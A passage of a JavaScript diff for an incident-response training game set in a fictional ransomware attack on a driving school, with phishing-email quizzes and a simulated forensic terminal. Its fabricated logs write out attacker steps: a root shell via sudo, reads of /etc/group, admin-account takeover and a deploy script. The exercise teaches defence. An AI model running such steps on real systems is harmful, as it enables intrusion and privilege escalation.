+    if (justClosedId === 'terminal-access-quiz' && gameState.pendingTimelineMsg != null) {
+        revealTimelineResults();
+    }
+}
+
+// Login System
+function initializeLogin() {
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const username = document.getElementById('username').value.toLowerCase();
+        const password = document.getElementById('password').value;
+
+        // Accept group1-group10 or employee1-employee10 with passwords SafeRoad1-SafeRoad10
+        const loginMatch = username.match(/^(?:group|employee)(\d+)$/);
+        if (loginMatch) {
+            const num = parseInt(loginMatch[1], 10);
+            if (num >= 1 && num <= 10 && password === `SafeRoad${num}`) {
+                gameState.currentGroup = username;
+                showScreen('ransomware-screen');
+                startRansomCountdown();
+                discoverEvidence('weak-passwords'); // Weak password evidence
+                return;
+            }
+        }
+
+        document.getElementById('login-error').style.display = 'block';
+    });
+}
+
+function showScreen(screenId) {
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+    document.getElementById(screenId).classList.add('active');
+}
+
+function startRansomCountdown() {
+    if (gameState.ransomCountdownEnd) return; // already running
+    gameState.ransomCountdownEnd = Date.now() + 2 * 60 * 60 * 1000;
+    const tick = () => {
+        const remaining = gameState.ransomCountdownEnd - Date.now();
+        const pad = n => String(n).padStart(2, '0');
+        const targets = [
+            document.getElementById('ransom-countdown'),
+            document.getElementById('portal-countdown')
+        ];
+        if (remaining <= 0) {
+            targets.forEach(t => { if (t) t.textContent = '00:00:00'; });
+            clearInterval(gameState.ransomCountdownInterval);
+            return;
+        }
+        const h = Math.floor(remaining / 3600000);
+        const m = Math.floor((remaining % 3600000) / 60000);
+        const s = Math.floor((remaining % 60000) / 1000);
+        const text = `${pad(h)}:${pad(m)}:${pad(s)}`;
+        targets.forEach(t => { if (t) t.textContent = text; });
+    };
+    tick();
+    gameState.ransomCountdownInterval = setInterval(tick, 1000);
+}
+
+function resetProgress() {
+    if (confirm('Are you sure? This will wipe all progress and return you to the login screen.')) {
+        location.reload();
+    }
+}
+
+function showIRPortal() {
+    showScreen('portal-screen');
+
+    // Initialize all portal components (only on first entry — they're idempotent
+    // since each clears its own DOM, but listener-attaching ones must not double up)
+    initializeEmails();
+    initializeTerminal();
+    initializeUserAudit();
+    initializeTimeline();
+    initializeIRPlan();
+    updateTerminalPrompt();
+}
+
+// Tab Switching
+function switchTab(tabName) {
+    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+    document.querySelectorAll('.tab-panel').forEach(panel => panel.classList.remove('active'));
+
+    // Mark the matching tab button active (works for both click and programmatic calls)
+    const matchingBtn = document.querySelector(`.tab-btn[onclick="switchTab('${tabName}')"]`);
+    if (matchingBtn) matchingBtn.classList.add('active');
+    document.getElementById(tabName + '-tab').classList.add('active');
+}
+
+// Email System
+// Fixed non-chronological display order so the email list doesn't hand the
+// timeline to the player, but stays consistent across reloads.
+const emailDisplayOrder = [...emails].sort(() => Math.random() - 0.5);
+
+function initializeEmails() {
+    const emailList = document.getElementById('email-list');
+    emailList.innerHTML = '';
+    emailDisplayOrder.forEach(email => {
+        const analyzed = gameState.analyzedEmails && gameState.analyzedEmails.has(email.id);
+        const statusClass = analyzed ? 'analyzed' : 'pending';
+        const statusText = analyzed ? '✓ Analyzed' : 'Pending';
+        const emailItem = document.createElement('div');
+        emailItem.className = 'email-item';
+        emailItem.innerHTML = `
+            <div class="email-item-main">
+                <div class="email-from">From: ${email.from}</div>
+                <div class="email-subject">${email.subject}</div>
+                <div class="email-date">${email.date}</div>
+            </div>
+            <div class="email-item-status ${statusClass}">${statusText}</div>
+        `;
+        emailItem.onclick = () => openEmail(email);
+        emailList.appendChild(emailItem);
+    });
+}
+
+function openEmail(email) {
+    gameState.emailsRead.add(email.id);
+    gameState.currentEmail = email;
+
+    const detailContent = document.getElementById('email-detail-content');
+    let analyzeButton = '';
+
+    // Show analyze button for ALL emails
+    const alreadyAnalyzed = gameState.analyzedEmails && gameState.analyzedEmails.has(email.id);
+    if (!alreadyAnalyzed) {
+        analyzeButton = '<button class="analyze-email-btn" onclick="startEmailAnalysis()">Analyze This Email</button>';
+    } else {
+        analyzeButton = '<p style="color: #4ade80; margin-top: 20px;">✓ Already analyzed</p>';
+    }
+
+    detailContent.innerHTML = `
+        <div class="email-header">
+            <div class="email-header-row"><strong>From:</strong> ${email.from}</div>
+            <div class="email-header-row"><strong>To:</strong> ${email.to}</div>
+            <div class="email-header-row"><strong>Date:</strong> ${email.date}</div>
+            <div class="email-header-row"><strong>Subject:</strong> ${email.subject}</div>
+        </div>
+        <div class="email-body">${email.body}</div>
+        ${analyzeButton}
+    `;
+
+    document.getElementById('email-list').style.display = 'none';
+    document.getElementById('email-detail').classList.add('active');
+}
+
+function closeEmail() {
+    document.getElementById('email-list').style.display = 'block';
+    document.getElementById('email-detail').classList.remove('active');
+    initializeEmails();
+}
+
+// Email Analysis System
+function startEmailAnalysis() {
+    const email = gameState.currentEmail;
+    gameState.emailAnalysisStep = 1;
+
+    document.getElementById('email-analysis-question').textContent = 'Mark this email as:';
+
+    const optionsContainer = document.getElementById('email-analysis-options');
+    optionsContainer.innerHTML = '';
+
+    const options = ['Legitimate Email', 'Phishing Email'];
+    options.forEach((option, index) => {
+        const optionEl = document.createElement('div');
+        optionEl.className = 'quiz-option';
+        optionEl.dataset.index = index;
+        optionEl.dataset.answer = option;
+        optionEl.textContent = option;
+        optionEl.onclick = () => selectEmailOption(index);
+        optionsContainer.appendChild(optionEl);
+    });
+
+    document.getElementById('email-analysis-submit').style.display = 'block';
+    document.getElementById('email-analysis-submit').onclick = submitEmailAnalysis;
+    document.getElementById('email-analysis-continue').style.display = 'none';
+    document.getElementById('email-analysis-feedback').classList.remove('visible');
+    document.getElementById('email-analysis-modal').classList.add('active');
+}
+
+function selectEmailOption(index) {
+    document.querySelectorAll('#email-analysis-options .quiz-option').forEach(opt => opt.classList.remove('selected'));
+    document.querySelector(`#email-analysis-options .quiz-option[data-index="${index}"]`).classList.add('selected');
+}
+
+function submitEmailAnalysis() {
+    const selected = document.querySelector('#email-analysis-options .quiz-option.selected');
+    if (!selected) {
+        alert('Please select an answer first.');
+        return;
+    }
+
+    const email = gameState.currentEmail;
+    if (gameState.analyzedEmails.has(email.id)) {
+        alert('You have already analyzed this email. No additional points can be earned.');
+        closeEmailAnalysis();
+        return;
+    }
+    const selectedAnswer = selected.dataset.answer;
+
+    if (gameState.emailAnalysisStep === 1) {
+        // Step 1: Is it phishing?
+        // For internal emails without isPhishing property, treat as legitimate
+        const emailIsPhishing = email.hasOwnProperty('isPhishing') ? email.isPhishing : false;
+        const isCorrect = (selectedAnswer === 'Phishing Email' && emailIsPhishing) ||
+                         (selectedAnswer === 'Legitimate Email' && !emailIsPhishing);
+
+        if (isCorrect) {
+            // Award points if the email has identificationPoints (phishing emails)
+            if (email.identificationPoints) {
+                gameState.score += email.identificationPoints;
+                gameState.emailPoints += email.identificationPoints;
+                updateScore();
+            }
+
+            // If they correctly identified phishing, move to step 2 WITHOUT showing feedback yet
+            if (emailIsPhishing && selectedAnswer === 'Phishing Email') {
+                document.getElementById('email-analysis-submit').style.display = 'none';
+                document.getElementById('email-analysis-continue').textContent = 'Identify Phishing Type';
+                document.getElementById('email-analysis-continue').style.display = 'block';
+                document.getElementById('email-analysis-continue').onclick = showPhishingTypeQuestion;
+            } else {
+                // Legitimate email - show feedback and finish
+                const feedbackEl = document.getElementById('email-analysis-feedback');
+
+                // Use email's feedback if available, otherwise provide generic feedback
+                if (email.feedback && email.feedback.correct) {
+                    feedbackEl.textContent = email.feedback.correct;
+                } else {
+                    feedbackEl.textContent = 'Correct! This is a legitimate internal email. Look for: safestartdriving.org domain, appropriate sender, legitimate business content, and no suspicious links or requests for credentials.';
+                }
+
+                feedbackEl.classList.add('visible', 'correct');
+                feedbackEl.classList.remove('incorrect');
+
+                gameState.analyzedEmails.add(email.id);
+                if (email.evidence) {
+                    discoverEvidence(email.evidence);
+                }
+                document.getElementById('email-analysis-submit').style.display = 'none';
+                document.getElementById('email-analysis-continue').textContent = 'Continue Investigation';
+                document.getElementById('email-analysis-continue').style.display = 'block';
+                document.getElementById('email-analysis-continue').onclick = closeEmailAnalysis;
+            }
+        } else {
+            const feedbackEl = document.getElementById('email-analysis-feedback');
+
+            // Use email's feedback if available, otherwise provide generic feedback
+            if (email.feedback && email.feedback.incorrect) {
+                feedbackEl.textContent = email.feedback.incorrect;
+            } else {
+                feedbackEl.textContent = 'Not quite. This is a legitimate internal email from a safestartdriving.org address with normal business content and no suspicious characteristics.';
+            }
+
+            feedbackEl.classList.add('visible', 'incorrect');
+            feedbackEl.classList.remove('correct');
+
+            document.getElementById('email-analysis-submit').style.display = 'none';
+            document.getElementById('email-analysis-continue').textContent = 'Continue Investigation';
+            document.getElementById('email-analysis-continue').style.display = 'block';
+            document.getElementById('email-analysis-continue').onclick = closeEmailAnalysis;
+
+            // Still mark as analyzed but no evidence
+            gameState.analyzedEmails.add(email.id);
+        }
+    }
+}
+
+function showPhishingTypeQuestion() {
+    const email = gameState.currentEmail;
+    gameState.emailAnalysisStep = 2;
+
+    document.getElementById('email-analysis-question').textContent = 'What type of phishing attack is this?';
+    document.getElementById('email-analysis-feedback').classList.remove('visible');
+
+    const optionsContainer = document.getElementById('email-analysis-options');
+    optionsContainer.innerHTML = '';
+
+    const types = [
+        'Urgency Phishing',
+        'Spear Phishing (Targeted)',
+        'Standard Phishing (Mass Email)',
+        'Clone Phishing (Copying Legitimate)',
+        'Whaling (Targeting Executives)'
+    ];
+
+    types.forEach((type, index) => {
+        const optionEl = document.createElement('div');
+        optionEl.className = 'quiz-option';
+        optionEl.dataset.index = index;
+        optionEl.dataset.answer = type;
+        optionEl.textContent = type;
+        optionEl.onclick = () => selectEmailOption(index);
+        optionsContainer.appendChild(optionEl);
+    });
+
+    document.getElementById('email-analysis-submit').style.display = 'block';
+    document.getElementById('email-analysis-submit').onclick = submitPhishingType;
+    document.getElementById('email-analysis-continue').style.display = 'none';
+}
+
+function submitPhishingType() {
+    const selected = document.querySelector('#email-analysis-options .quiz-option.selected');
+    if (!selected) {
+        alert('Please select a phishing type.');
+        return;
+    }
+
+    const email = gameState.currentEmail;
+    if (gameState.analyzedEmails.has(email.id)) {
+        alert('You have already analyzed this email. No additional points can be earned.');
+        closeEmailAnalysis();
+        return;
+    }
+    const selectedType = selected.dataset.answer;
+    const isCorrect = selectedType === email.phishingType;
+
+    const feedbackEl = document.getElementById('email-analysis-feedback');
+
+    if (isCorrect) {
+        gameState.score += email.typePoints;
+        gameState.emailPoints += email.typePoints;
+        updateScore();
+        feedbackEl.textContent = email.feedback.typeCorrect;
+        feedbackEl.classList.add('visible', 'correct');
+        feedbackEl.classList.remove('incorrect');
+    } else {
+        feedbackEl.textContent = email.feedback.typeIncorrect;
+        feedbackEl.classList.add('visible', 'incorrect');
+        feedbackEl.classList.remove('correct');
+    }
+
+    // Award evidence and finish
+    gameState.analyzedEmails.add(email.id);
+    if (email.evidence) {
+        discoverEvidence(email.evidence);
+    }
+
+    document.getElementById('email-analysis-submit').style.display = 'none';
+    document.getElementById('email-analysis-continue').textContent = 'Continue Investigation';
+    document.getElementById('email-analysis-continue').style.display = 'block';
+    document.getElementById('email-analysis-continue').onclick = closeEmailAnalysis;
+}
+
+function backToEmail() {
+    // Simply close the modal without marking as analyzed, allowing user to re-read the email
+    document.getElementById('email-analysis-modal').classList.remove('active');
+    document.getElementById('email-analysis-feedback').classList.remove('visible', 'correct', 'incorrect');
+    gameState.emailAnalysisStep = 1;
+}
+
+function closeEmailAnalysis() {
+    document.getElementById('email-analysis-modal').classList.remove('active');
+    document.getElementById('email-analysis-feedback').classList.remove('visible', 'correct', 'incorrect');
+    gameState.emailAnalysisStep = 1;
+
+    // Refresh the email view to show "Already analyzed"
+    openEmail(gameState.currentEmail);
+
+    // Fire the phishing quiz once all emails are analyzed
+    if (gameState.analyzedEmails.size >= emails.length && !gameState.answeredQuizzes.has('phishing-quiz')) {
+        showQuiz('phishing-quiz');
+    }
+}
+
+// Evidence System (internal tracking only - no visual board)
+function discoverEvidence(evidenceId) {
+    if (gameState.discoveredEvidence.has(evidenceId)) return;
+
+    gameState.discoveredEvidence.add(evidenceId);
+
+    // NO POINTS AWARDED - evidence discovery only triggers quizzes now
+    // Points are ONLY awarded for: quiz answers, user audit identification, timeline, and IR plan
+
+}
+
+function updateScore() {
+    const el = document.getElementById('current-score');
+    if (el) el.textContent = gameState.score;
+}
+
+// Virtual File System Structure
+const fileSystem = {
+    '/home/forensic': {
+        type: 'dir',
+        contents: ['system_logs', 'exports', 'Documents']
+    },
+    '/home/forensic/system_logs': {
+        type: 'symlink',
+        target: '/var/log'
+    },
+    '/home/forensic/exports': {
+        type: 'dir',
+        contents: ['user_activity.log']
+    },
+    '/home/forensic/exports/user_activity.log': {
+        type: 'file',
+        content: 'getUserActivityLog'
+    },
+    '/home/forensic/Documents': {
+        type: 'dir',
+        contents: ['staff_handbook_2026.txt', 'q1_enrollment_report.txt', 'vehicle_maintenance_log.txt', 'instructor_certifications.txt', 'spring_fundraiser_notes.txt']
+    },
+    '/home/forensic/Documents/staff_handbook_2026.txt': {
+        type: 'file',
+        content: 'docStaffHandbook'
+    },
+    '/home/forensic/Documents/q1_enrollment_report.txt': {
+        type: 'file',
+        content: 'docQ1Enrollment'
+    },
+    '/home/forensic/Documents/vehicle_maintenance_log.txt': {
+        type: 'file',
+        content: 'docVehicleMaintenance'
+    },
+    '/home/forensic/Documents/instructor_certifications.txt': {
+        type: 'file',
+        content: 'docInstructorCerts'
+    },
+    '/home/forensic/Documents/spring_fundraiser_notes.txt': {
+        type: 'file',
+        content: 'docFundraiserNotes'
+    },
+    '/var': {
+        type: 'dir',
+        contents: ['log']
+    },
+    '/var/log': {
+        type: 'dir',
+        contents: ['auth.log', 'syslog', 'apache2', 'README.txt']
+    },
+    '/var/log/README.txt': {
+        type: 'file',
+        content: 'getLogsReadme'
+    },
+    '/var/log/auth.log': {
+        type: 'file',
+        content: 'getAuthLog'
+    },
+    '/var/log/syslog': {
+        type: 'file',
+        content: 'getSyslog'
+    },
+    '/var/log/apache2': {
+        type: 'dir',
+        contents: ['access.log', 'error.log']
+    },
+    '/var/log/apache2/access.log': {
+        type: 'file',
+        content: 'getAccessLog'
+    },
+    '/var/log/apache2/error.log': {
+        type: 'file',
+        content: 'getErrorLog'
+    }
+};
+
+// Terminal System
+let terminalHistoryIndex = -1; // -1 means "not navigating history"
+let terminalDraftLine = '';    // What the user had typed before pressing ↑
+
+function initializeTerminal() {
+    const input = document.getElementById('terminal-input');
+
+    // Click anywhere in the terminal area to focus the input (real-shell behavior)
+    const container = input.closest('.terminal-container');
+    if (container) {
+        container.addEventListener('click', function(e) {
+            // Don't steal focus if the user is selecting text
+            if (window.getSelection().toString() === '') input.focus();
+        });
+    }
+
+    // Arrow-key history navigation (like a real shell). Must use keydown
+    // because keypress doesn't fire for arrow keys.
+    input.addEventListener('keydown', function(e) {
+        const history = gameState.commandHistory;
+        if (e.key === 'ArrowUp') {
+            if (history.length === 0) return;
+            e.preventDefault(); // stop the cursor from jumping to position 0
+            if (terminalHistoryIndex === -1) {
+                terminalDraftLine = input.value; // save what they were typing
+                terminalHistoryIndex = history.length - 1;
+            } else if (terminalHistoryIndex > 0) {
+                terminalHistoryIndex--;
+            }
+            input.value = history[terminalHistoryIndex];
+            // Place cursor at end of line
+            requestAnimationFrame(() => {
+                input.setSelectionRange(input.value.length, input.value.length);
+            });
+        } else if (e.key === 'ArrowDown') {
+            if (terminalHistoryIndex === -1) return;
+            e.preventDefault();
+            if (terminalHistoryIndex < history.length - 1) {
+                terminalHistoryIndex++;
+                input.value = history[terminalHistoryIndex];
+            } else {
+                // Past the most recent — restore the draft they were typing
+                terminalHistoryIndex = -1;
+                input.value = terminalDraftLine;
+                terminalDraftLine = '';
+            }
+            requestAnimationFrame(() => {
+                input.setSelectionRange(input.value.length, input.value.length);
+            });
+        }
+    });
+
+    input.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            const command = input.value;
+            input.value = '';
+            terminalHistoryIndex = -1; // reset history cursor on submit
+            terminalDraftLine = '';
+            executeCommand(command);
+        } else if (e.key === 'c' && e.ctrlKey) {
+            const output = document.getElementById('terminal-output');
+            let displayPath = gameState.logicalDirectory;
+            if (displayPath === '/home/forensic') displayPath = '~';
+            else if (displayPath.startsWith('/home/forensic/')) displayPath = '~/' + displayPath.substring(15);
+            output.innerHTML += `forensic@safestart:${displayPath}$ ${escapeHTML(input.value)}^C\n`;
+            input.value = '';
+            output.scrollTop = output.scrollHeight;
+            e.preventDefault();
+        }
+    });
+    updateTerminalPrompt(); // Set initial prompt
+}
+
+function executeCommand(command) {
+    const output = document.getElementById('terminal-output');
+
+    // Get display path for prompt
+    let displayPath = gameState.logicalDirectory;
+    if (displayPath === '/home/forensic') {
+        displayPath = '~';
+    } else if (displayPath.startsWith('/home/forensic/')) {
+        displayPath = '~/' + displayPath.substring(15);
+    }
+
+    // If empty command (just Enter pressed), show prompt and return
+    if (!command || command.trim() === '') {
+        output.innerHTML += `forensic@safestart:${displayPath}$ \n`;
+        output.scrollTop = output.scrollHeight;
+        return;
+    }
+
+    output.innerHTML += `forensic@safestart:${displayPath}$ ${escapeHTML(command)}\n`;
+
+    // Parse command respecting quoted strings (e.g. grep "failed login" auth.log)
+    const parts = [];
+    let current = '';
+    let inQuote = false;
+    let quoteChar = '';
+    for (let i = 0; i < command.length; i++) {
+        const ch = command[i];
+        if (inQuote) {
+            if (ch === quoteChar) { inQuote = false; }
+            else { current += ch; }
+        } else if (ch === '"' || ch === "'") {
+            inQuote = true; quoteChar = ch;
+        } else if (ch === ' ') {
+            if (current) { parts.push(current); current = ''; }
+        } else {
+            current += ch;
+        }
+    }
+    if (current) parts.push(current);
+
+    const cmd = parts[0];
+    const args = parts.slice(1);
+
+    let result = '';
+    let isHTML = false;
+
+    switch(cmd) {
+        case 'help':
+            result = 'Available commands: ls, cd, cat, grep, pwd, whoami, clear';
+            break;
+        case 'pwd':
+            result = gameState.logicalDirectory;
+            break;
+        case 'whoami':
+            result = 'forensic';
+            break;
+        case 'ls':
+            result = executeLS(args);
+            isHTML = true;
+            break;
+        case 'cd':
+            result = executeCD(args[0]);
+            updateTerminalPrompt();
+            break;
+        case 'cat':
+            result = executeCAT(args[0]);
+            break;
+        case 'grep':
+            result = executeGREP(args);
+            break;
+        case 'history':
+            result = 'history: no command history for user forensic.\nHint: Each user\'s activity may be stored in their home directory.';
+            break;
+        case 'clear':
+            output.textContent = '';
+            return;
+        default:
+            result = `Command not found: ${cmd}\nType 'help' for available commands.`;
+    }
+
+    output.innerHTML += (isHTML ? result : escapeHTML(result)) + '\n\n';
+    output.scrollTop = output.scrollHeight;
+    gameState.commandHistory.push(command);
+}
+
+function escapeHTML(str) {
+    return str
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;');
+}
+
+function updateTerminalPrompt() {
+    const promptEl = document.getElementById('terminal-prompt');
+    let displayPath = gameState.logicalDirectory;
+    if (displayPath === '/home/forensic') {
+        displayPath = '~';
+    } else if (displayPath.startsWith('/home/forensic/')) {
+        displayPath = '~/' + displayPath.substring(15);
+    }
+    promptEl.textContent = `forensic@safestart:${displayPath}$`;
+}
+
+function executeLS(args) {
+    // Parse flags and path from args (args may be a string or array)
+    let flags = '';
+    let path = null;
+
+    if (typeof args === 'string') {
+        // Legacy call with single string path
+        path = args || null;
+    } else if (Array.isArray(args)) {
+        args.forEach(arg => {
+            if (arg.startsWith('-')) flags += arg;
+            else path = arg;
+        });
+    }
+
+    const showHidden = flags.includes('a') || flags.includes('A');
+    const targetPath = path || gameState.currentDirectory;
+
+    if (!pathExists(targetPath)) {
+        return `ls: cannot access '${path}': No such file or directory`;
+    }
+
+    const resolved = resolvePath(targetPath);
+
+    if (!isDirectory(resolved)) {
+        const parts = resolved.split('/');
+        return parts[parts.length - 1];
+    }
+
+    const entry = fileSystem[resolved];
+
+    // Trigger evidence discovery for specific paths
+    if (resolved === '/var/log') {
+        discoverEvidence('no-mfa');
+    }
+
+    // Filter dotfiles unless -a flag is used
+    const contents = entry.contents.filter(name => showHidden || !name.startsWith('.'));
+
+    if (contents.length === 0 && !showHidden && entry.contents.some(n => n.startsWith('.'))) {
+        return `(empty — try 'ls -la' to show hidden files)`;
+    }
+
+    // Color directories blue, files white
+    return contents.map(name => {
+        const childPath = resolved === '/' ? '/' + name : resolved + '/' + name;
+        const isDir = fileSystem[childPath] && (fileSystem[childPath].type === 'dir' || fileSystem[childPath].type === 'symlink');
+        if (isDir) {
+            return `<span style="color:#5b9bd5;font-weight:bold;">${name}</span>`;
+        } else {
+            return `<span style="color:#e0e0e0;">${name}</span>`;
+        }
+    }).join('  ');
+}
+
+function executeCD(path) {
+    if (!path) {
+        gameState.currentDirectory = '/home/forensic';
+        gameState.logicalDirectory = '/home/forensic';
+        return '';
+    }
+
+    // Compute the logical target (what the user thinks they're navigating to),
+    // resolving . and .. relative to the logical directory so users can always
+    // back out of symlinked locations like ~/system_logs.
+    let logicalTarget;
+    if (path === '.') {
+        logicalTarget = gameState.logicalDirectory;
+    } else if (path.startsWith('/') || path === '~' || path.startsWith('~/')) {
+        logicalTarget = (path === '~') ? '/home/forensic'
+                      : path.startsWith('~/') ? '/home/forensic/' + path.slice(2)
+                      : path;
+    } else {
+        const base = gameState.logicalDirectory === '/' ? '' : gameState.logicalDirectory;
+        logicalTarget = base + '/' + path;
+    }
+
+    // Normalize . and .. in the logical target
+    const parts = logicalTarget.split('/').filter(p => p);
+    const normalizedParts = [];
+    for (const part of parts) {
+        if (part === '.') continue;
+        if (part === '..') { normalizedParts.pop(); continue; }
+        normalizedParts.push(part);
+    }
+    logicalTarget = '/' + normalizedParts.join('/');
+
+    // Permission check is based on the *logical* path, so users can always
+    // step back up toward /home/forensic even from a symlinked location.
+    if (!logicalTarget.startsWith('/home/forensic')) {
+        return `cd: ${path}: Permission denied — your access is restricted to the forensic snapshot.`;
+    }
+
+    if (!pathExists(logicalTarget)) {
+        return `cd: ${path}: No such file or directory`;
+    }
+
+    const resolved = resolvePath(logicalTarget);
+
+    if (!isDirectory(resolved)) {
+        return `cd: ${path}: Not a directory`;
+    }
+
+    // Physical (symlink-resolved) directory for file operations
+    gameState.currentDirectory = resolved;
+    // Logical directory for the prompt display
+    gameState.logicalDirectory = logicalTarget;
+
+    return '';
+}
+
+function executeCAT(file) {
+    if (!file) return 'cat: missing file operand';
+
+    if (!pathExists(file)) {
+        return `cat: ${file}: No such file or directory`;
+    }
+
+    const resolved = resolvePath(file);
+
+    if (isDirectory(resolved)) {
+        return `cat: ${file}: Is a directory`;
+    }
+
+    const entry = fileSystem[resolved];
+
+    if (!entry || entry.type !== 'file') {
+        return `cat: ${file}: No such file or directory`;
+    }
+
+    // Trigger evidence discovery for specific files
+    if (resolved === '/var/log/auth.log') {
+        discoverEvidence('foreign-ip');
+        return getAuthLog();
+    } else if (resolved === '/var/log/syslog') {
+        discoverEvidence('ransomware-deployed');
+        return getSyslog();
+    } else if (resolved === '/var/log/apache2/access.log') {
+        discoverEvidence('credentials-compromised');
+        return getAccessLog();
+    } else if (resolved === '/var/log/apache2/error.log') {
+        return getErrorLog();
+    } else if (resolved === '/home/forensic/exports/user_activity.log') {
+        discoverEvidence('privilege-escalation');
+        return getUserActivityLog();
+    } else if (resolved === '/var/log/README.txt') {
+        return getLogsReadme();
+    } else if (resolved === '/home/forensic/Documents/staff_handbook_2026.txt') {
+        return docStaffHandbook();
+    } else if (resolved === '/home/forensic/Documents/q1_enrollment_report.txt') {
+        return docQ1Enrollment();
+    } else if (resolved === '/home/forensic/Documents/vehicle_maintenance_log.txt') {
+        return docVehicleMaintenance();
+    } else if (resolved === '/home/forensic/Documents/instructor_certifications.txt') {
+        return docInstructorCerts();
+    } else if (resolved === '/home/forensic/Documents/spring_fundraiser_notes.txt') {
+        return docFundraiserNotes();
+    }
+
+    return `cat: ${file}: No content available`;
+}
+
+function executeGREP(args) {
+    if (args.length < 2) return 'grep: missing search pattern or file';
+
+    const pattern = args[0].replace(/['"]/g, '');
+    const file = args[1];
+
+    if (!pathExists(file)) {
+        return `grep: ${file}: No such file or directory`;
+    }
+
+    const resolved = resolvePath(file);
+
+    if (isDirectory(resolved)) {
+        return `grep: ${file}: Is a directory`;
+    }
+
+    let content = '';
+    if (resolved === '/var/log/auth.log') {
+        content = getAuthLog();
+    } else if (resolved === '/var/log/syslog') {
+        content = getSyslog();
+    } else if (resolved === '/var/log/apache2/access.log') {
+        content = getAccessLog();
+    } else if (resolved === '/var/log/apache2/error.log') {
+        content = getErrorLog();
+    } else if (resolved === '/home/forensic/exports/user_activity.log') {
+        content = getUserActivityLog();
+    } else {
+        return `grep: ${file}: No content available`;
+    }
+
+    const lines = content.split('\n');
+    const matches = lines.filter(line => line.toLowerCase().includes(pattern.toLowerCase()));
+
+    if (pattern.toLowerCase().includes('bulgaria') || pattern.includes('185.220')) {
+        discoverEvidence('foreign-ip');
+    }
+
+    return matches.length > 0 ? matches.join('\n') : `(no matches found)`;
+}
+
+function normalizePath(path) {
+    if (!path || path === '~') return '/home/forensic';
+
+    // Handle tilde expansion
+    if (path.startsWith('~/')) {
+        path = '/home/forensic/' + path.slice(2);
+    } else if (path === '~') {
+        return '/home/forensic';
+    }
+
+    // If relative path, prepend current directory
+    if (!path.startsWith('/')) {
+        path = gameState.currentDirectory + '/' + path;
+    }
+
+    // Normalize the path (handle . and ..)
+    const parts = path.split('/').filter(p => p);
+    const normalized = [];
+
+    for (const part of parts) {
+        if (part === '.') {
+            // Current directory, skip
+            continue;
+        } else if (part === '..') {
+            // Parent directory
+            if (normalized.length > 0) {
+                normalized.pop();
+            }
+        } else {
+            normalized.push(part);
+        }
+    }
+
+    return '/' + normalized.join('/');
+}
+
+function resolvePath(path) {
+    // Resolve symlinks
+    const normalized = normalizePath(path);
+    const entry = fileSystem[normalized];
+
+    if (entry && entry.type === 'symlink') {
+        return resolvePath(entry.target);
+    }
+
+    return normalized;
+}
+
+function pathExists(path) {
+    const resolved = resolvePath(path);
+    return fileSystem.hasOwnProperty(resolved);
+}
+
+function isDirectory(path) {
+    const resolved = resolvePath(path);
+    const entry = fileSystem[resolved];
+    return entry && entry.type === 'dir';
+}
+
+function isFile(path) {
+    const resolved = resolvePath(path);
+    const entry = fileSystem[resolved];
+    return entry && entry.type === 'file';
+}
+
+function getAuthLog() {
+    return `Feb 15 10:14:02 safestart sudo: awong : TTY=pts/0 ; PWD=/home/awong ; USER=root ; COMMAND=/usr/sbin/usermod -aG domain_admins mgarcia
+Feb 15 10:14:02 safestart usermod[8821]: add 'mgarcia' to group 'domain_admins'
+Feb 15 10:14:03 safestart usermod[8821]: add 'mgarcia' to shadow group 'domain_admins'
+Mar 21 08:28:15 safestart sshd[1245]: Failed password for smartinez from 192.168.1.45
+Mar 21 08:28:22 safestart sshd[1246]: Failed password for smartinez from 192.168.1.45
+Mar 21 08:29:45 safestart sshd[1259]: Account smartinez locked due to 15 failed attempts
+Mar 21 08:31:18 safestart sudo: awong : TTY=pts/1 ; PWD=/home/awong ; USER=root ; COMMAND=/usr/sbin/faillock --user smartinez --reset
+Mar 21 08:31:19 safestart faillock[1258]: reset failure count for user smartinez
+Mar 21 08:31:52 safestart sshd[1260]: Accepted password for smartinez from 192.168.1.45
+Mar 21 15:52:14 safestart nginx[1398]: POST /login - user jwallace - credentials submitted from 192.168.1.55
+Mar 21 16:15:38 safestart sshd[1402]: Accepted password for jwallace from 185.220.101.47
+Mar 21 16:15:38 safestart sshd[1402]: pam_unix(sshd:session): session opened for user jwallace
+Mar 21 16:15:45 safestart sudo: jwallace : TTY=pts/2 ; COMMAND=/bin/bash
+Mar 21 17:22:14 safestart sudo: jwallace : COMMAND=/usr/bin/id mgarcia
+Mar 21 17:22:15 safestart sudo: jwallace : COMMAND=/usr/bin/groups mgarcia
+Mar 21 17:28:42 safestart sudo: jwallace : COMMAND=/bin/cat /etc/group
+Mar 21 17:28:43 safestart sudo: jwallace : COMMAND=/usr/bin/getent group sudo
+Mar 21 17:29:15 safestart sudo: jwallace : NOTE: User mgarcia discovered with Domain Admin privileges
+Mar 21 17:30:28 safestart su[1523]: Successful su for mgarcia by root
+Mar 21 17:30:29 safestart sshd[1524]: pam_unix(sshd:session): session opened for user mgarcia
+Mar 21 17:35:42 safestart sudo: mgarcia : COMMAND=/bin/bash
+Mar 22 02:15:33 safestart sshd[1789]: Accepted password for mgarcia from 185.220.101.47
+Mar 23 23:45:12 safestart sshd[2103]: Accepted password for mgarcia from 185.220.101.47
+Mar 23 23:47:28 safestart sudo: mgarcia : COMMAND=/usr/bin/python3 /tmp/deploy.py`;
+}
+
+function getSyslog() {
+    return `Mar 21 16:15:39 safestart systemd[1]: Started Session 21 of user jwallace.
+Mar 21 17:22:15 safestart systemd[1]: Started Session 25 for user mgarcia.
+Mar 22 02:15:34 safestart systemd[1]: Started Session 33 of user mgarcia.
+Mar 23 23:45:13 safestart systemd[1]: Started Session 47 of user mgarcia.
+Mar 23 23:47:30 safestart kernel: python3[2156]: segfault
+Mar 23 23:47:35 safestart systemd[1]: Started process encrypt-service.
+Mar 24 08:00:01 safestart systemd[1]: Started process ransomware-trigger.timer.
+Mar 24 08:00:02 safestart kernel: [CRITICAL] Mass file encryption detected on /var/lib/mysql
+Mar 24 08:00:03 safestart kernel: [CRITICAL] Mass file encryption detected on /home`;
+}
+
+function getAccessLog() {
+    return `185.220.101.47 - - [21/Mar/2026:16:18:44] "GET /admin/dashboard HTTP/1.1" 200
+185.220.101.47 - - [21/Mar/2026:16:19:22] "GET /admin/users HTTP/1.1" 200
